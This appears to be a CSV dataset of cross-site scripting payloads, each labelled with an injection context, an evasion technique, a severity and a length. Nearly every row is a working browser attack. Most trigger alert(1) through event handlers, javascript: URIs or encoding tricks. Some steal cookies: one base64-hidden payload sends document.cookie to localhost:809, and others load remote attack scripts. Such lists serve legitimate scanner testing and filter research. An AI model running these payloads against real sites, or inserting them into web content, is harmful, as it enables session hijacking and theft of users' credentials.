payload,context,technique,severity,length
"<abbr ondblclick=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,48
<tfoot onpointerleave=alert(1) style=display:block>AnonKryptiQuz</tfoot>,tag_injection,none,medium,72
<svg/onload=self[`aler`%2b`t`]`AnonKryptiQuz`>,tag_injection,url_encoding,low,46
<command onpointerleave=alert(1) style=display:block>AnonKryptiQuz</command>,tag_injection,none,medium,76
"<datalist onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</datalist>",tag_injection,none,medium,72
"<noframes oncut=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",tag_injection,none,medium,67
"<main id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></main>",tag_injection,none,medium,84
"<applet onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",tag_injection,none,medium,73
"[alert][0].call(this,1)",generic,none,low,23
"<div draggable=""true"" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>",tag_injection,none,medium,111
"<audio onmouseup=""alert(1)"">AnonKryptiQuz</audio>",tag_injection,none,medium,49
"<summary draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</summary>",tag_injection,none,medium,72
"<thead draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</thead>",tag_injection,none,medium,66
<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>,tag_injection,none,medium,52
"<acronym draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</acronym>",tag_injection,none,medium,72
<data onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",js_uri,none,low,74
"<header onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</header>",tag_injection,none,medium,85
<pre onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54
"<cite onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",tag_injection,none,medium,69
"<keygen onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",tag_injection,none,medium,73
<button popovertarget=x>Click me</button><div onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</div>,tag_injection,none,medium,102
"<BGSOUND SRC=""javascript:javascript:alert(2563);"">",js_uri,case_variation,medium,50
"<dfn onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",tag_injection,none,medium,67
"<dl onmouseup=""alert(1)"">AnonKryptiQuz</dl>",tag_injection,none,medium,43
%3Cscript%3Ealert(1)%3C/script%3E##1,generic,url_encoding,medium,36
"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(';XSS';)"";)}<;/STYLE>;",js_uri,none,medium,88
"<u onclick=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,39
<u onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,51
<xmp onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53
<b id=x tabindex=1 onactivate=alert(1)></b>,tag_injection,none,medium,43
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;,js_uri,none,medium,120
"<tr oncut=""alert(1)"" contenteditable>AnonKryptiQuz</tr>",tag_injection,none,medium,55
"<style>@keyframes slidein {}</style><img2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></img2>",tag_injection,none,medium,162
<big onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</big><input value=clickme>,tag_injection,none,medium,106
<head id=x tabindex=1 onfocus=alert(1) style=display:block></head>,tag_injection,none,medium,66
"<track onmouseleave=""alert(1)"">AnonKryptiQuz</track>",tag_injection,none,medium,52
<tt contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,56
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationend=""alert(1)""></input>",tag_injection,none,medium,95
"<nobr oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</nobr>",tag_injection,none,medium,71
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(4543)"">DEF",js_uri,none,medium,67
"<xmp onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",tag_injection,none,medium,65
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;,js_uri,none,medium,117
"&lt;A HREF=\""htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,85
"javascript:prompt(1)#{""action"":1}",template_injection,none,medium,33
"<embed oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,73
<meter onpointerup=alert(1) style=display:block>AnonKryptiQuz</meter>,tag_injection,none,medium,69
<blink/,generic,none,low,7
<animatetransform onpointerup=alert(1) style=display:block>AnonKryptiQuz</animatetransform>,tag_injection,none,medium,91
"<u oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,94
"<area oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</area>",tag_injection,none,medium,60
"<FRAMESET><FRAME SRC=""javascript:document.vulnerable=true;""></frameset>",dom_sink,case_variation,low,71
<multicol onpointerdown=alert(1) style=display:block>AnonKryptiQuz</multicol>,tag_injection,none,medium,77
"<main draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</main>",tag_injection,none,medium,86
"<tfoot draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</tfoot>",tag_injection,none,medium,68
"<label ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</label>",tag_injection,none,medium,91
"<marquee oncut=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",tag_injection,none,medium,65
<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,tag_injection,none,medium,66
document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>'),dom_sink,encoding,high,98
"<summary draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</summary>",tag_injection,none,medium,72
"<table onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</table>",tag_injection,none,medium,63
<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>,tag_injection,none,medium,82
with(document)alert(cookie),generic,none,medium,27
"<section onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,73
"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>",tag_injection,none,medium,111
"<big onclick=""alert(1)"">AnonKryptiQuz</big>",tag_injection,none,medium,43
<video onloadstart=alert(1)><source>,tag_injection,none,medium,36
<select onpointerenter=alert(1) style=display:block>AnonKryptiQuz</select>,tag_injection,none,medium,74
<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>,tag_injection,none,medium,74
"<ins id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></ins>",tag_injection,none,medium,82
"<small draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</small>",tag_injection,none,medium,86
"<th draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</th>",tag_injection,none,medium,82
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",script_injection,case_variation,medium,77
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,tag_injection,none,medium,72
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable style=display:block>drop here</li>",tag_injection,none,medium,125
<footer contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",js_uri,case_variation,medium,85
"<frame onmouseleave=""alert(1)"">AnonKryptiQuz</frame>",tag_injection,none,medium,52
"""><A%20%252F=""""Href=%20JavaScript:k='%22',top[k+'lert']('AnonKryptiQuz')"">",js_uri,url_encoding|case_variation,low,74
<svg><dialog onload=alert(1)></dialog>,tag_injection,none,medium,38
"<Svg On Only=1 Onload=alert(""hex"")>",tag_injection,case_variation,medium,35
"<button oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,100
<*script>prompt(123)<*/script>,generic,none,medium,30
<button popovertarget=x>Click me</button><samp ontoggle=alert(1) popover id=x>AnonKryptiQuz</samp>,tag_injection,none,medium,98
"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionstart=alert(1)></canvas>",tag_injection,none,medium,112
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></cite>",tag_injection,none,medium,101
"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF",js_uri,none,medium,82
"<a href=""\xE2\x80\x88javascript:javascript:alert(6186)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82
<slot onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55
"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(3110)"">DEF",js_uri,none,medium,67
"<plaintext onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</plaintext>",tag_injection,none,medium,79
alert('foo');,generic,none,medium,13
"<input2 oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</input2>",tag_injection,none,medium,75
<mark onpointerover=alert(1) style=display:block>AnonKryptiQuz</mark>,tag_injection,none,medium,69
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationstart=""alert(1)""></em>",tag_injection,none,medium,91
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>,tag_injection,none,medium,70
<th onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</th><input value=clickme>,tag_injection,none,medium,95
"<u onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</u>",tag_injection,none,medium,63
<textarea autofocus onfocus=alert(1)>//INJECTX,tag_injection,none,medium,46
"<u onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</u>",tag_injection,none,medium,57
"<b oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,94
"<animatemotion draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",tag_injection,none,medium,104
""" onload=alert&#0000000040origin) value=""",attribute_escape,html_entity,low,41
<source onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68
<script itworksinallbrowsers>/*<script* */alert(1)</script ?,script_injection,comment_injection,medium,60
"""><body/oNpagEshoW=(confirm)(document.domain)>",dom_sink,none,low,46
<thead onpointerout=alert(1) style=display:block>AnonKryptiQuz</thead>,tag_injection,none,medium,70
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",tag_injection,none,medium,119
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",dom_sink,comment_injection|case_variation,low,149
"<shadow onmouseup=""alert(1)"">AnonKryptiQuz</shadow>",tag_injection,none,medium,51
<span id=x tabindex=1 onfocus=alert(1)></span>,tag_injection,none,medium,46
"<keygen oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
"<em onmouseover=""alert(1)"">AnonKryptiQuz</em>",tag_injection,none,medium,45
"<base onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</base>",tag_injection,none,medium,63
<data onpointerenter=alert(1) style=display:block>AnonKryptiQuz</data>,tag_injection,none,medium,70
"<a draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</a>",tag_injection,none,medium,80
<strike onpointerover=alert(1) style=display:block>AnonKryptiQuz</strike>,tag_injection,none,medium,73
\”}})})-confirm`AnonKryptiQuz`;({{/*///,generic,none,low,39
"<dt ondblclick=""alert(1)"">AnonKryptiQuz</dt>",tag_injection,none,medium,44
"<article onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</article>",tag_injection,none,medium,73
"<audio draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",tag_injection,none,medium,88
"""><img src=x onerror=javascript:alert((`1`))>",js_uri,none,medium,45
%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003ealert('AnonKryptiQuz')%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,generic,none,medium,124
"window.name=""javascript:confirm((window.opener||window).document.cookie);"";",dom_sink,none,high,75
"<html draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</html>",tag_injection,none,medium,66
"<select onchange=""alert('AnonKryptiQuz')""><option>Option</option></select>",tag_injection,none,medium,74
"<legend id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></legend>",tag_injection,none,medium,88
"<mark id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></mark>",tag_injection,none,medium,84
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></summary>",tag_injection,none,medium,118
<track onpointerdown=alert(1) style=display:block>AnonKryptiQuz</track>,tag_injection,none,medium,71
"<iframe onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</iframe>",tag_injection,none,medium,87
"<optgroup ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</optgroup>",tag_injection,none,medium,97
"<html onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</html>",tag_injection,none,medium,68
"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",dom_sink,encoding|url_encoding,high,313
"<multicol onmouseleave=""alert(1)"">AnonKryptiQuz</multicol>",tag_injection,none,medium,58
"<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",generic,none,medium,56
"<image xmlns:xlink=""http://www.w3.org/1999/xlink"">",attribute_escape,none,low,50
<script>alert(document.domain)</script>,dom_sink,none,medium,39
<svg><caption onload=alert(1)></caption>,tag_injection,none,medium,40
"<nextid onmouseup=""alert(1)"">AnonKryptiQuz</nextid>",tag_injection,none,medium,51
<form onpointerleave=alert(1) style=display:block>AnonKryptiQuz</form>,tag_injection,none,medium,70
<main onpointerover=alert(1) style=display:block>AnonKryptiQuz</main>,tag_injection,none,medium,69
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;,generic,none,low,73
<button popovertarget=x>Click me</button><rt ontoggle=alert(1) popover id=x>AnonKryptiQuz</rt>,tag_injection,none,medium,94
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(2807)//></style>",js_uri,none,medium,82
"<tr onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</tr>",tag_injection,none,medium,57
"<strike onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</strike>",tag_injection,none,medium,65
"<nav onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</nav>",tag_injection,none,medium,79
"<object onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</object>",tag_injection,none,medium,74
"<div STYLE=""background-image: url(javascript:document.vulnerable=true;)"">",dom_sink,none,low,73
"<data onmousemove=""alert(1)"">AnonKryptiQuz</data>",tag_injection,none,medium,49
<ins onpointerout=alert(1) style=display:block>AnonKryptiQuz</ins>,tag_injection,none,medium,66
<main contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,58
"<marquee ondblclick=""alert(1)"">AnonKryptiQuz</marquee>",tag_injection,none,medium,54
"<audio onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></audio>",tag_injection,none,medium,283
"<small onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</small>",tag_injection,none,medium,66
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>",tag_injection,none,medium,107
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",attribute_escape,case_variation,high,243
&amp;amp;lt;img/src/onerror=alert(`AnonKryptiQuz`)&amp;amp;gt;,event_handler,none,medium,62
"<iframe onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</iframe>",tag_injection,none,medium,68
"<canvas onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",tag_injection,none,medium,73
"<xhzeem attr="" --- x=""=='='onmouseover=confirm`xhzeem` style=""display:block;width:1000px;height:1000px;background:red""> --- "">",tag_injection,none,low,126
<cite onpointerleave=alert(1) style=display:block>AnonKryptiQuz</cite>,tag_injection,none,medium,70
"<frame onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,83
aaaaa\”-confirm`AnonKryptiQuz`//,generic,none,low,32
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",tag_injection,none,medium,95
<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>,tag_injection,none,medium,58
%c0″//(0000%0dconfirm(1)//,generic,url_encoding,medium,26
"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></button>",tag_injection,none,medium,115
"<slot draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</slot>",tag_injection,none,medium,61
"<code onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</code>",tag_injection,none,medium,61
"<data draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</data>",tag_injection,none,medium,66
<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>,tag_injection,none,medium,62
"<noframes onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</noframes>",tag_injection,none,medium,89
"<div draggable=""true"" contenteditable>drag me</div><u ondragover=alert(1) contenteditable style=display:block>drop here</u>",tag_injection,none,medium,123
"<main onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</main>",tag_injection,none,medium,70
"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",dom_sink,url_encoding,high,335
<aside onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</aside>,tag_injection,none,medium,76
"<label onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</label>",tag_injection,none,medium,72
"<i onmouseenter=""alert(1)"">AnonKryptiQuz</i>",tag_injection,none,medium,44
"<details onmousedown=""alert(1)"">AnonKryptiQuz</details>",tag_injection,none,medium,55
"<strong draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",tag_injection,none,medium,85
"<object draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,70
<section onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58
"""><img src=x onerror=prompt('document.domain');>.html",dom_sink,none,medium,53
<script>({0:#0=alert/#0#/#0#(0)})</script>,script_injection,none,low,42
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable style=display:block>drop here</footer>",tag_injection,none,medium,133
"<legend onmousedown=""alert(1)"">AnonKryptiQuz</legend>",tag_injection,none,medium,53
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onwebkitanimationend=""alert(1)""></sub>",tag_injection,none,medium,97
"<IMG SRC=x onchange=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,59
"""&amp;amp;gt;&amp;amp;lt;svg onload=alert(1)&amp;amp;gt;",attribute_escape,none,medium,56
[1].find(alert),generic,none,low,15
"<code onmousemove=""alert(1)"">AnonKryptiQuz</code>",tag_injection,none,medium,49
"<bdo onclick=""alert(1)"">AnonKryptiQuz</bdo>",tag_injection,none,medium,43
setTimeout`alert\x2823\x29`,generic,none,low,27
"<style>:target {color: red;}</style><small id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></small>",tag_injection,none,medium,113
"<a href=""\x03javascript:javascript:alert(4212)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74
"<div draggable=""true"" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>",tag_injection,none,medium,99
#&lt;script&gt;prompt(document.domain)&lt;&#47;script&gt;,dom_sink,html_entity,medium,57
"<spacer ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,93
"<video src=x onerror=""prompt(xss)"">",tag_injection,none,medium,35
"<table ondblclick=""alert(1)"">AnonKryptiQuz</table>",tag_injection,none,medium,50
<video onpointerout=alert(1) style=display:block>AnonKryptiQuz</video>,tag_injection,none,medium,70
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationend=""alert(1)""></dfn>",tag_injection,none,medium,91
"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=print()></iframe>",tag_injection,none,low,129
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></bdi>",tag_injection,none,medium,99
&#x03C,generic,html_entity,low,6
<script>alert\u00281\u0029</script>,script_injection,unicode_escape,low,35
"<q ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</q>",tag_injection,none,medium,83
"<iframe src=""http://example.org/""></iframe>",attribute_escape,none,low,43
"<title ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</title>",tag_injection,none,medium,91
"<nextid draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</nextid>",tag_injection,none,medium,68
"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>",tag_injection,none,medium,104
&#x27;&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;&#x27;,event_handler,html_entity,medium,58
"<style>:target {color:red;}</style><audio2 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></audio2>",tag_injection,none,medium,112
<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>,generic,none,medium,52
"<th onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</th>",tag_injection,none,medium,79
"<tfoot oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
<address onpointerout=alert(1) style=display:block>AnonKryptiQuz</address>,tag_injection,none,medium,74
"<style>@keyframes slidein {}</style><a2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></a2>",tag_injection,none,medium,164
'-alert(1)//,attribute_escape,none,medium,12
"<area onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</area>",tag_injection,none,medium,83
"<rb onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</rb>",tag_injection,none,medium,60
<animatetransform onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,66
<legend onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</legend><input value=clickme>,tag_injection,none,medium,112
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></label>",tag_injection,none,medium,180
"<script a="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",script_injection,none,low,67
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style=""position:absolute;"" onanimationcancel=""print()""></rtc>",tag_injection,none,low,175
"&lt;IMG SRC=\""livescript&#058;&#91;code&#93;\""&gt;",generic,html_entity,low,50
"<noframes id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></noframes>",tag_injection,none,medium,92
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",js_uri,none,medium,56
"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=print()></strike>",tag_injection,none,low,129
"<link onmousedown=""alert(1)"">AnonKryptiQuz</link>",tag_injection,none,medium,49
"<kbd onmouseenter=""alert(1)"">AnonKryptiQuz</kbd>",tag_injection,none,medium,48
"<section onmouseover=""alert(1)"">AnonKryptiQuz</section>",tag_injection,none,medium,55
"<button ondblclick=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,52
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",js_uri,none,medium,87
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image3 id=x style=""position:absolute;"" onanimationcancel=""print()""></image3>",tag_injection,none,low,181
"?goto=javascript:alert(1)"",",js_uri,none,medium,27
<shadow onpointermove=alert(1) style=display:block>AnonKryptiQuz</shadow>,tag_injection,none,medium,73
"<strong onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</strong>",tag_injection,none,medium,88
<frame onpointerout=alert(1) style=display:block>AnonKryptiQuz</frame>,tag_injection,none,medium,70
<embed src=1 onerror=alert(1) type=image/gif>,tag_injection,none,medium,45
"<caption draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</caption>",tag_injection,none,medium,67
<animate onpointerleave=alert(1) style=display:block>AnonKryptiQuz</animate>,tag_injection,none,medium,76
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></summary>",tag_injection,none,medium,107
"<audio draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",tag_injection,none,medium,86
<content onpointerup=alert(1) style=display:block>AnonKryptiQuz</content>,tag_injection,none,medium,73
"<p onmousemove=""alert(1)"">AnonKryptiQuz</p>",tag_injection,none,medium,43
"<img onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</img>",tag_injection,none,medium,66
"<div onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</div>",tag_injection,none,medium,67
"""><script+src=""https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)""></script>",script_injection,none,medium,96
"<p draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</p>",tag_injection,none,medium,75
"<style>:target {color:red;}</style><img2 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></img2>",tag_injection,none,medium,108
<option id=x tabindex=1 onbeforeactivate=alert(1)></option>,tag_injection,none,medium,59
"<dt onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</dt>",tag_injection,none,medium,59
